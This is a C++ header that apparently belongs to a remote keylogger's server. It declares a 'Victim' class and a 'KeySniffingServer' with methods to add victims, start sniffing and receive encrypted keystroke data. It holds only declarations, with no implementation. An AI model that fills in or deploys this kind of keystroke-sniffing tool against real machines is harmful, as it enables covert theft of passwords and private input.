#ifndef SERVER_H
#define SERVER_H

#include "common/common.hpp"
#include "common/cryptographer.hpp"

class Victim
{
    int id_;
    std::string ip_;
    struct sockaddr_in addr_;

public:
    Victim(int id, std::string const &ip);

    int Id() const;
    std::string Ip() const;
    struct sockaddr_in Addr() const;
};

class KeySniffingServer
{
    typedef std::map<int, Victim*> Victims;
    Victims victims_;

    struct sockaddr_in addr_;
    int port_;
    int sockfd_;

    std::thread *thrRecv_;
    bool stop_;

    Cryptographer cryptographer_;

    void StartSniffing(Victim const &victim);
    void ReceiveKeySniffingInfo();

public:
    KeySniffingServer(std::string const &ip, int port);

    void AddVictim(std::string const &ip);

    void Start();
    void Stop();
    void Wait();
};

int crypto_init_environment() __attribute__((constructor));
int crypto_free_environment() __attribute__((destructor));

#endif // SERVER_H
